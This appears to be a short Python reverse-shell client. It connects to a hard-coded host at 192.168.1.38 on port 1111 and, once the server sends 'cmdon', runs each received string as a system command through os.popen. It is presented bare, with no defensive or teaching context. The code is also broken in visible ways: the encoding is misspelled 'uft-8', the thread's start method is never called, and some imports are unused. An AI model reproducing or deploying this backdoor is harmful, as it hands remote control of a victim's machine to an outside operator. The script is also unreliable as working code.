from http import server
from pydoc import cli
import socket
import os
import threading
def tj():
    HOST = '192.168.1.38'
    PORT = 1111
    ADDR = (HOST,PORT)
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM )
    client.connect(ADDR)
    cmd_mode = False
    while True:
        server_command = client.recv(1024).decode('utf-8')
        if server_command == 'cmdon':
            cmd_mode = True
            client.send("Mode ACtivate ".encode("uft-8"))
            continue
        if server_command == 'cmdoff':
            cmd_mode = False
        if cmd_mode:
            os.popen(server_command)
        else:
            pass
        client.send(f"{server_command}Execute Successfully ".encode("uft-8"))

t1 = threading.Thread(target=tj)
t1.start

